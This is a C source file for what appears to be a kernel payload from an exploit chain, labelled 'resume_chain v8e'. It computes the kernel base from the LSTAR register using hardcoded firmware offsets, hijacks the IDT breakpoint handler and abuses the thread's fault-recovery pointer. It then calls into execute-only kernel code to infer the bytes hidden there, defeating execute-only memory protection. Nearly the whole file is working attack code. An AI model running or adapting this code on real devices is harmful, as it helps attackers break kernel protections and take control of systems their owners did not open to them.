#include <stdint.h>

/*
 * resume_chain v8e — execution-based CC byte scanner
 *
 * For each apic_ops entry, CALLs fn-1 with sentinel in RAX:
 *   - If fn-1 = CC (INT3): IDT[3]=doreti_iret catches it, fn executes, returns
 *   - If fn-1 = C3 (ret):  immediate return, RAX = sentinel (unchanged)
 *   - If fn-1 = other:     unpredictable, pcb_onfault catches faults
 *
 * ktext is XOM — cannot read bytes. Must EXECUTE to identify them.
 *
 * Output layout:
 *   out[0]     = MAGIC (lo32) + status (hi32)
 *   out[1]     = kdata_base
 *   out[2]     = ktext_base
 *   out[3]     = td_pcb
 *   out[4..31] = apic_ops fn ptrs (from kdata, safe)
 *   out[32]    = step progress
 *   out[33..60]= call result for each entry (RAX after call)
 *                0xCC000000000000XX = CC detected, fn returned XX
 *                sentinel unchanged = C3 (ret)
 *                0xFAFAFAFA = faulted (pcb_onfault caught)
 *                0x5B5B5B5B = skipped (dangerous entry)
 *   out[61]    = cc_bitmap
 *   out[62]    = c3_bitmap
 *   out[63]    = end marker
 *
 * SKIPPED entries (dangerous side effects):
 *   [6]  disable     — disables LAPIC
 *   [8]  ipi_raw     — sends raw IPI to other CPUs
 *   [9]  ipi_vectored — sends IPI
 *   [23] timer_initial_count — may corrupt timer
 */

#define MAGIC_RSCN       0x5253434E
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218
#define OFF_APIC_OPS     0x1934AC8
#define OFF_IDT          0x64cdc80
#define OFF_DORETI_IRET  (-0x9cf84c)
#define IDT_ENTRY_SIZE   16
#define APIC_OPS_COUNT   28

#define TD_PCB           0x3f8
#define PCB_ONFAULT      0x108

#define SENTINEL         0xBAD0BAD0BAD0BAD0ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint16_t read2(uint64_t addr)
{
    return *(volatile uint16_t *)addr;
}

static inline void write2(uint64_t addr, uint16_t val)
{
    *(volatile uint16_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

static inline void write1(uint64_t addr, uint8_t val)
{
    *(volatile uint8_t *)addr = val;
}

static inline uint32_t read4(uint64_t addr)
{
    return *(volatile uint32_t *)addr;
}

static inline void write4(uint64_t addr, uint32_t val)
{
    *(volatile uint32_t *)addr = val;
}

static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t ist)
{
    write2(idt_entry_addr + 0, (uint16_t)(handler & 0xFFFF));
    uint8_t byte4 = read1(idt_entry_addr + 4);
    write1(idt_entry_addr + 4, (byte4 & 0xF8) | (ist & 0x07));
    write2(idt_entry_addr + 6, (uint16_t)((handler >> 16) & 0xFFFF));
    write4(idt_entry_addr + 8, (uint32_t)((handler >> 32) & 0xFFFFFFFF));
}


/*
 * Call fn-1 with sentinel in RAX, pcb_onfault for crash recovery.
 * Returns RAX value after the call.
 * On fault: returns 0xFAFAFAFAFAFAFAFA.
 */
static uint64_t probe_fn_minus1(uint64_t fn_minus1, uint64_t onfault_addr)
{
    uint64_t result;
    __asm__ volatile(
        /* Arm pcb_onfault for crash recovery */
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%[onfault])\n\t"

        /* Load sentinel into RAX, then call fn-1 */
        "movabsq $0xBAD0BAD0BAD0BAD0, %%rax\n\t"
        "callq *%[target]\n\t"

        /* Success path: save RAX result */
        "movq %%rax, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"

        /* Fault recovery */
        "2:\n\t"
        "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"

        "1:\n\t"
        : [result] "=&r"(result)
        : [target] "r"(fn_minus1), [onfault] "r"(onfault_addr)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "memory", "cc"
    );
    return result;
}

/* Entries to skip (dangerous side effects) */
static int is_dangerous(int i)
{
    return (i == 6)   /* disable */
        || (i == 8)   /* ipi_raw */
        || (i == 9)   /* ipi_vectored */
        || (i == 23);  /* timer_initial_count */
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;

    out[1] = kdata_base;
    out[2] = ktext_base;

    /* Write magic EARLY for crash-safe readback */
    out32[1] = 0x008E;
    __asm__ volatile("mfence" ::: "memory");
    out32[0] = MAGIC_RSCN;

    out[32] = 0x01;  /* step: starting */

    /* Get curthread → td_pcb → onfault_addr */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);
    out[3] = td_pcb;

    if (!td_pcb) {
        out32[1] = 0x00FF;
        return 0;
    }

    uint64_t onfault_addr = td_pcb + PCB_ONFAULT;

    /* Read all 28 fn ptrs from kdata (proven safe) */
    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
    for (int i = 0; i < APIC_OPS_COUNT; i++)
        out[4 + i] = read8(apic_ops_addr + i * 8);

    out[32] = 0x02;  /* step: fn ptrs read */

    /* Save original IDT[3] (16 bytes) */
    uint64_t idt_base = kdata_base + OFF_IDT;
    uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
    uint64_t idt3_orig_lo = read8(idt3_addr);
    uint64_t idt3_orig_hi = read8(idt3_addr + 8);

    /* Set IDT[3] = doreti_iret, IST=0 (just iretq for INT3 recovery) */
    uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
    idt_set_handler(idt3_addr, doreti_iret, 0);

    out[32] = 0x03;  /* step: IDT[3] armed */

    /* Probe each entry */
    uint64_t cc_bitmap = 0;
    uint64_t c3_bitmap = 0;

    for (int i = 0; i < APIC_OPS_COUNT; i++) {
        uint64_t fn = out[4 + i];

        if (fn == 0 || is_dangerous(i)) {
            out[33 + i] = 0x5B5B5B5B5B5B5B5BULL;  /* skipped */
            continue;
        }

        out[32] = 0x100 + i;  /* step: probing entry i */

        uint64_t result = probe_fn_minus1(fn - 1, onfault_addr);
        out[33 + i] = result;

        if (result == SENTINEL) {
            /* RAX unchanged → fn-1 was C3 (ret) */
            c3_bitmap |= (1ULL << i);
        } else if (result != 0xFAFAFAFAFAFAFAFAULL) {
            /* RAX changed AND didn't fault → fn-1 was CC (INT3 → fn executed) */
            cc_bitmap |= (1ULL << i);
        }
    }

    /* Restore original IDT[3] */
    write8(idt3_addr, idt3_orig_lo);
    write8(idt3_addr + 8, idt3_orig_hi);

    out[61] = cc_bitmap;
    out[62] = c3_bitmap;
    out[63] = 0xdeadbeefcafe008EULL;

    /* Final status */
    out32[1] = 0x018E;  /* v8e complete */

    return 0;
}
